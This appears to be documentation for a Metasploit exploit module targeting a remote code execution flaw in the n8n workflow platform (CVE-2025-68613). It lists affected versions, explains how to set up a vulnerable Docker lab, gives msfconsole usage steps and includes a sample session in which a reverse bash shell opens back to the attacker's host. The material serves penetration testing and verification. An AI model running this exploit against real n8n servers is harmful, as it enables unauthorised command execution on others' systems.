## Vulnerable Application

This module exploits CVE-2025-68613, a critical remote code execution vulnerability in n8n, an open-source workflow automation platform. The vulnerability exists in the workflow expression evaluation system, where user-supplied expressions are evaluated in an execution context that is not sufficiently isolated from the underlying Node.js runtime.

An authenticated attacker can create a workflow containing malicious expressions that escape the sandbox and execute arbitrary system commands.

**Affected Versions:**
- n8n >= 0.211.0 and < 1.120.4
- n8n >= 1.121.0 and < 1.121.1
- n8n >= 1.122.0 (unpatched pre-releases)

**Fixed Versions:** 1.120.4, 1.121.1, 1.122.0

### Installation

1. Run a vulnerable n8n instance using Docker:
```bash
docker run -d --name n8n-vuln -p 5678:5678 \
  -e N8N_BASIC_AUTH_ACTIVE=true \
  -e N8N_BASIC_AUTH_USER=admin \
  -e N8N_BASIC_AUTH_PASSWORD=password \
  n8nio/n8n:1.120.0
```

2. Access n8n at `http://localhost:5678` and complete initial setup if required.

## Verification Steps

1. Install a vulnerable n8n instance
2. Start msfconsole
3. Do: `use exploit/multi/http/n8n_workflow_expression_rce`
4. Do: `set RHOSTS <target>`
5. Do: `set USERNAME <email>`
6. Do: `set PASSWORD <password>`
7. Do: `run`
8. You should get a shell

## Options

### USERNAME
The n8n username or email for authentication. Required.

### PASSWORD
The n8n password for authentication. Required.

### TARGETURI
Base path to n8n. Default is `/`.

## Scenarios

### n8n 1.120.0 on Docker (Linux)

```
msf6 > use exploit/multi/http/n8n_workflow_expression_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/n8n_workflow_expression_rce) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(multi/http/n8n_workflow_expression_rce) > set USERNAME admin@example.com
USERNAME => admin@example.com
msf6 exploit(multi/http/n8n_workflow_expression_rce) > set PASSWORD password123
PASSWORD => password123
msf6 exploit(multi/http/n8n_workflow_expression_rce) > set LHOST 192.168.1.50
LHOST => 192.168.1.50
msf6 exploit(multi/http/n8n_workflow_expression_rce) > run

[*] Started reverse TCP handler on 192.168.1.50:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 1.120.0 is vulnerable (< 1.120.4)
[*] Attempting to authenticate...
[+] Successfully authenticated
[*] Creating malicious workflow...
[+] Created workflow with ID: abc123
[*] Executing workflow abc123...
[*] Workflow execution response: 200
[*] Command shell session 1 opened (192.168.1.50:4444 -> 192.168.1.100:45678)

id
uid=1000(node) gid=1000(node) groups=1000(node)
whoami
node
```
